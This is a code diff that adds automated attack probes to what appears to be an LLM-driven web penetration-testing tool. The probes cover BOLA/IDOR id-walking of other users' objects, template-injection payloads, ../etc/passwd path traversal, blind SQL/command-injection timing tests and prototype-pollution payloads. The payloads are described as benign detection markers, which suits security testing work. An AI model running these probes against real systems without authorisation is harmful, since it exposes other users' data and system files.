+    cands = list(dict.fromkeys(cands))[:25]
+    for coll in cands:
+        try:
+            raw = _ccall(["http-request", coll], hdr, args.debug)
+            d = (_j(raw).get("data") or [{}])[0] or {}
+            if int(d.get("status") or 0) != 200:
+                continue
+            body = str(d.get("content") or "")
+            if not body.lstrip().startswith("["):              # need a JSON array (a collection listing)
+                continue
+            my_ids = re.findall(id_rx, body)
+            my_owners = set(o.lower() for o in re.findall(owner_rx, body)) | ({my_marker} if my_marker else set())
+            if not my_owners:
+                continue                                       # can't tell "mine" from "theirs" -> skip (avoid FP)
+            walk = []
+            for mid in my_ids[:4]:
+                m = re.match(r"^(.*?)(\d+)$", str(mid))
+                if m:
+                    base, n = m.group(1), int(m.group(2))
+                    walk += [f"{base}{k}" for k in range(max(1, n - 2), n + 4)]
+            walk += ["1", "2", "3", "4", "5"] + list(store.ids_seen[:8])
+            walk = [w for w in dict.fromkeys(str(x) for x in walk) if w not in my_ids][:12]
+            for wid in walk:
+                iu = coll.rstrip("/") + "/" + wid
+                r2 = _ccall(["http-request", iu], hdr, args.debug)
+                d2 = (_j(r2).get("data") or [{}])[0] or {}
+                if int(d2.get("status") or 0) != 200:
+                    continue
+                b2 = str(d2.get("content") or "")
+                if not b2.lstrip().startswith("{"):
+                    continue
+                owners2 = set(o.lower() for o in re.findall(owner_rx, b2))
+                is_private = re.search(r'"private"\s*:\s*true', b2, re.I) is not None
+                if owners2 and not (owners2 & my_owners):      # returned object belongs to someone else
+                    store.add_findings([{"severity": "high",
+                        "title": f"BOLA/IDOR: {urlparse(coll).path}/<id> returns another principal's object",
+                        "url": iu, "evidence": f"authed GET of an id I was not granted returns an object owned by "
+                        f"{sorted(owners2)[:1]} (mine: {sorted(my_owners)[:1]}){'; marked private' if is_private else ''}",
+                        "phase": "P2"}], "P2")
+                    debug_print(f"caleb :: bola-walk HIT {urlparse(iu).path} (foreign owner {sorted(owners2)[:1]})")
+                    break                                      # one confirmation per collection
+        except Exception as exc:  # noqa: BLE001
+            debug_print(f"caleb :: bola-walk err on {coll}: {exc}")
+
+
+def _ssti_traversal_probe(store: ArtifactStore, sm: SessionManager, args) -> None:
+    """AUTHED SSTI + PATH-TRAVERSAL (deterministic, observation-driven). With a held identity, POST a BENIGN
+    template marker to render/report/template/preview-style endpoints and set file/path/export params to a
+    traversal string. A COMPUTED value (73*137 -> 10001) or the passwd banner (root:x:0:0) coming back proves the
+    sink EVALUATED our input (not merely reflected it). Benign markers only - no destructive command. Endpoints are
+    discovered + a generic sink wordlist; the finding rests on the OBSERVED computed value / file content, nothing
+    target-specific. This is the SSTI/LFI reach a weak model won't drive by hand - and the highest-severity class on
+    these targets, chronically missed unauth/agentically."""
+    sess = next((s for s in store.sessions if s.get("headers")), None)
+    hdr = sess["headers"] if sess else []
+    roots = [f"{urlparse(store.base_url).scheme}://{h}" for h in store.hosts]
+    sink_kw = ("render", "template", "report", "preview", "generate", "export", "compile", "format",
+               "translate", "message", "notify", "pdf", "print", "receipt", "invoice", "email")
+    eps = set()
+    for e in store.endpoints:
+        if any(k in urlparse(e["url"]).path.lower() for k in sink_kw):
+            eps.add(e["url"].split("?")[0])
+    for r in roots:
+        for p in _CONV_SINK_PATHS[:12]:
+            eps.add(f"{r}/{p}")
+    eps = list(eps)[:12]
+    # ---- SSTI: a benign arithmetic marker that must EVALUATE (73*137 = 10001), across the common engine syntaxes
+    ssti_fields = ("template", "content", "body", "subject", "name", "title", "message", "text", "html", "value")
+    MARK = "10001"
+    for ep in eps:
+        for payload in ("{{73*137}}", "${73*137}", "<%= 73*137 %>", "#{73*137}"):
+            try:
+                _st, resp = bob._rest_post(ep, {f: payload for f in ssti_fields}, hdr, args.debug)
+            except Exception:  # noqa: BLE001
+                continue
+            if MARK in str(resp) and payload not in str(resp):
+                store.add_findings([{"severity": "high",
+                    "title": f"Server-side template injection on {urlparse(ep).path}",
+                    "url": ep, "evidence": "a benign template marker (73*137) was EVALUATED to 10001 in the response "
+                    "(input not merely reflected) -> SSTI (escalates to RCE)", "phase": "P2"}], "P2")
+                debug_print(f"caleb :: ssti HIT {urlparse(ep).path}")
+                break
+    # ---- PATH TRAVERSAL / LFI: read /etc/passwd via a file/path/export param, confirmed by the passwd banner
+    trav_eps = list(dict.fromkeys(eps + [f"{r}/{p}" for r in roots for p in (
+        "api/export", "api/download", "api/file", "api/files", "api/documents", "api/locale", "download", "export")]))[:14]
+    trav_fields = ("file", "path", "name", "doc", "document", "template", "export", "filename", "locale", "page")
+    for ep in trav_eps:
+        for tp in ("../../../../../../etc/passwd", "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"):
+            try:
+                for u in (f"{ep}?file={tp}", f"{ep}?path={tp}"):
+                    d = (_j(_ccall(["http-request", u], hdr, args.debug)).get("data") or [{}])[0] or {}
+                    if "root:x:0:0" in str(d.get("content") or ""):
+                        store.add_findings([{"severity": "high", "title": f"Path traversal / LFI on {urlparse(ep).path}",
+                            "url": u, "evidence": "a ../etc/passwd traversal returned the passwd file (root:x:0:0) -> LFI",
+                            "phase": "P2"}], "P2")
+                        debug_print(f"caleb :: traversal HIT {urlparse(ep).path}")
+                        return
+                _st, resp = bob._rest_post(ep, {f: tp for f in trav_fields}, hdr, args.debug)
+                if "root:x:0:0" in str(resp):
+                    store.add_findings([{"severity": "high", "title": f"Path traversal / LFI on {urlparse(ep).path}",
+                        "url": ep, "evidence": "a ../etc/passwd traversal in the body returned root:x:0:0 -> LFI",
+                        "phase": "P2"}], "P2")
+                    debug_print(f"caleb :: traversal HIT {urlparse(ep).path}")
+                    return
+            except Exception:  # noqa: BLE001
+                continue
+
+
+def _blind_probe(store: ArtifactStore, sm: SessionManager, args) -> None:
+    """DETERMINISTIC blind SQLi / OS-command detection (run-to-run CONSISTENCY). Runs the validated blind-oracle
+    differential (boolean-tracks-baseline + delay-SCALING time test) on every discovered id/search/filter/token
+    param with a held identity - so blind detection no longer rides on the agent CHOOSING to drive sqlmap (the
+    blindspot 0<->4 flake). Bounded (few endpoints, short delay) so the time-tests don't blow the runtime."""
+    sess = next((s for s in store.sessions if s.get("headers")), None)
+    hdr = sess["headers"] if sess else []
+    hint = ("search", "list", "query", "find", "lookup", "filter", "report", "item", "product", "order", "user",
+            "account", "dish", "note", "ticket", "record", "api", "detail", "view", "get")
+    targets = []
+    for e in store.endpoints:
+        u = e["url"]
+        pr = urlparse(u)
+        if pr.query:                                   # observed params -> test as-is
+            targets.append(u)
+        elif any(k in pr.path.lower() for k in hint):  # likely param-bearing -> append canonical test params
+            targets.append(f"{u.split('?')[0]}?id=1&q=test")
+    seen, uniq = set(), []
+    for u in targets:                                  # dedup by path, cap tightly (time-tests are ~seconds each)
+        key = urlparse(u).path
+        if key not in seen:
+            seen.add(key); uniq.append(u)
+    for u in uniq[:6]:
+        for f in (_j(_ccall(["blind-oracle", u, "--delay", "3"], hdr, args.debug)).get("data") or []):
+            store.add_findings([{"severity": f.get("severity", "high"),
+                                 "title": f.get("title", "Blind injection"),
+                                 "url": f.get("url", u.split("?")[0]),
+                                 "evidence": (f.get("info") or "confirmed blind injection")[:140]}], "P2-blind")
+
+
+def _proto_pollution_probe(store: ArtifactStore, sm: SessionManager, args) -> None:
+    """DETERMINISTIC prototype-pollution probe (consistency for the cogwork-class flake). POST a `__proto__` marker
+    to JSON write endpoints, then RE-FETCH a fresh object; if the polluted key leaks onto an object that never had
+    it, that is real pollution (not mere reflection). Conservative - a bare reflection is only a suggestion."""
+    sess = next((s for s in store.sessions if s.get("headers")), None)
+    hdr = sess["headers"] if sess else []
+    write_kw = ("update", "profile", "account", "settings", "preferences", "config", "save", "edit", "set",
+                "merge", "import", "patch", "user")
+    read_kw = ("me", "profile", "account", "config", "settings", "status", "info", "whoami")
+    roots = [f"{urlparse(store.base_url).scheme}://{h}" for h in store.hosts]
+    eps = {e["url"].split("?")[0] for e in store.endpoints
+           if any(k in urlparse(e["url"]).path.lower() for k in write_kw)}
+    reads = [e["url"].split("?")[0] for e in store.endpoints
+             if any(k in urlparse(e["url"]).path.lower() for k in read_kw)]
+    for r in roots:
+        reads += [f"{r}/api/me", f"{r}/api/config", f"{r}/api/status"]
+    MARK = "bcpp0"
+    for ep in list(eps)[:8]:
+        for payload in ({"__proto__": {MARK: MARK}}, {"constructor": {"prototype": {MARK: MARK}}}):
+            try:
+                st, resp = bob._rest_post(ep, payload, hdr, args.debug)
+            except Exception:  # noqa: BLE001
+                continue
+            if st is None:
+                continue
+            # confirm: the polluted key now appears on a FRESH read object that shouldn't carry it
+            for ru in reads[:4]:
+                d = (_j(_ccall(["http-request", ru], hdr, args.debug)).get("data") or [{}])
+                if d and MARK in str(d[0]):
+                    store.add_findings([{"severity": "high", "title": f"Prototype pollution via {urlparse(ep).path}",
+                                         "url": ep, "evidence": f"__proto__ payload polluted a fresh object at "
+                                         f"{urlparse(ru).path} (marker leaked)"}], "P2-proto")
+                    return
+
+
+def _api_map_probe(store: ArtifactStore, sm: SessionManager, args) -> None:
+    """DETERMINISTIC method-aware discovery (the cheap-model win). Run api-map WITH a held identity's headers, fed
+    the paths already discovered, to surface the WRITE surface (POST/PUT/PATCH/DELETE-only routes) and HIDDEN verbs
+    on a KNOWN path - a route the crawl only saw GET on that ALSO accepts PATCH/DELETE with no ownership check is a
+    state-changing BOLA the frontend never exposed. The found endpoints (with their REAL verbs) are fed into the
+    store so the mass-assign / BOLA-walk / biz-logic passes exercise them - the reach a weak model won't drive by
+    hand. Non-destructive (api-map sends empty-body probes; DELETE is inferred, never sent to a real path)."""
+    sess = next((s for s in store.sessions if s.get("headers")), None)
+    hdr = sess["headers"] if sess else []
+    scheme = urlparse(store.base_url).scheme
+    write_verbs = ("POST", "PUT", "PATCH", "DELETE")
+    for host in store.hosts:
+        base = f"{scheme}://{host}"
+        disc = sorted({urlparse(e["url"]).path for e in store.endpoints
+                       if (urlparse(e["url"]).hostname or "").lower() == host
+                       and urlparse(e["url"]).path not in ("", "/")})[:150]
+        argv = ["api-map", base, "--max-paths", "260", "--budget", "90", "--concurrency", "10"]
+        if disc:
+            argv += ["--paths", ",".join(disc)]
+        try:
+            raw = _ccall(argv, hdr, args.debug)
+        except Exception as exc:  # noqa: BLE001
+            debug_print(f"caleb :: api-map err on {host}: {exc}")
+            continue
+        nwrite = 0
+        for f in (_j(raw).get("data") or []):
+            url = f.get("url")
+            methods = f.get("methods") or []
+            if not url or not isinstance(methods, list):
+                continue
+            for m in methods:
+                if isinstance(m, str) and m.upper() in ("GET",) + write_verbs:
+                    store.add_endpoint(url, m.upper(), "api-map")     # feed the exploitation passes the real verbs
+            writes = [m.upper() for m in methods if isinstance(m, str) and m.upper() in write_verbs]
+            if writes:
+                nwrite += 1
+                store.add_lead("write-endpoint", f"{','.join(writes)} {urlparse(url).path}", "P2")
+        if nwrite:
+            debug_print(f"caleb :: api-map: +{nwrite} write endpoint(s) mapped on {host}")
+
+
 def _run_caleb(store: ArtifactStore, args) -> None:
     sm = SessionManager(store, args)
     phase_p0_recon(store, args)                       # observe + seed + one bob baseline
@@ -2268,7 +2803,13 @@ def _run_caleb(store: ArtifactStore, args) -> None:
     _agentic_driver(store, sm, args)                  # AGENTIC-FIRST: the LLM drives the mission
     # DETERMINISTIC BACKSTOP: guarantee the mechanical coverage the agent may have skipped (same split as bob).
     phase_p1_identity(store, sm, args)
+    _mass_assign_probe(store, sm, args)               # obs-driven mass-assignment (spec-less; register role-diff)
+    _api_map_probe(store, sm, args)                   # method-map the surface (authed) -> feed WRITE endpoints/verbs
     phase_p2_authed(store, sm, args, only_new=True)
+    _bola_walk_observed(store, sm, args)              # obs-driven BOLA id-walk (spec-less; observed collections+ids)
+    _ssti_traversal_probe(store, sm, args)            # deterministic authed SSTI (73*137->10001) + LFI (/etc/passwd)
+    _blind_probe(store, sm, args)                     # deterministic blind SQLi/cmd via blind-oracle (consistency)
+    _proto_pollution_probe(store, sm, args)           # deterministic prototype-pollution (consistency, conservative)
     phase_p3_chain(store, sm, args)
     store.persist()
     # bounded loop-back if a new identity/lead appeared
@@ -2370,7 +2911,9 @@ def add_arguments(parser) -> None:
                         help="Directory for the artifact store snapshot (default opt/caleb_artifacts/)")
     parser.add_argument("--max-rounds", dest="max_rounds", type=int, default=2,
                         help="Max review->P2/P3 loop-backs when new identities/leads appear (default 2)")
-    add_agent_args(parser, max_steps=60)       # caleb's tools are high-level, so far fewer steps than bob need
+    add_agent_args(parser, max_steps=120)      # raised from 60: the exhaustive per-endpoint battery on a big
+    # multi-endpoint API (a challenge board, a 12-route spec) needs room to finish - at 60 the agent ran out of
+    # steps mid-battery and coverage went low + high-variance (the-range swung 3/12..11/12 run-to-run).
 
 
 def run(args) -> int:
